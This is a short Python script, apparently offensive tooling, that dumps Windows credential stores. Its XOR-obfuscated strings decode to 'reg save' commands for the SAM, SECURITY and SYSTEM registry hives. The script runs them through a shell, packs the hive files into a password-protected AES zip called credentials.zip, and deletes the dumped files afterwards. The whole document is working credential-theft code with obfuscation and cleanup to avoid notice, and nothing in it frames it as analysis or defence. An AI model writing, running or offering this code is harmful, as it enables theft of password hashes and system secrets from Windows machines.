import subprocess
import pyzipper

# The obfuscation is basic bitwise operation with the actual index+2

# The obfuscated commands
command_array_creation=["pge\"qctg\"JINO^Q[QVGO\"Q[QVGO,jkt", "qfd#pbuf#KHON_PF@VQJWZ#PF@VQJWZ-kju", "vac$wera$LOHIXWEI$WEI*lmr"]
command_array_removal=["del SYSTEM.HIV", "del SECURITY.HIV", "del SAM.HIV"]

for index in range (0,len(command_array_creation),1):
    
    # Deobfuscate the command
    command = ''.join(chr(ord(c) ^ index+2) for c in command_array_creation[index])
    
    # Execute the command
    result = subprocess.run(command, shell=True, capture_output=True, text=True)

# Create a password protected archive file
with pyzipper.AESZipFile('credentials.zip','w',compression=pyzipper.ZIP_DEFLATED,encryption=pyzipper.WZ_AES) as zf:
    zf.setpassword(b'G@heR34+6$x.at3Acbg2!35')
    zf.write('SYSTEM.HIV')
    zf.write('SECURITY.HIV')
    zf.write('SAM.HIV')

# Remove the registry imports
for index in range (0,len(command_array_removal),1):
    
    # Execute the command
    result = subprocess.run(command_array_removal[index], shell=True, capture_output=True, text=True)
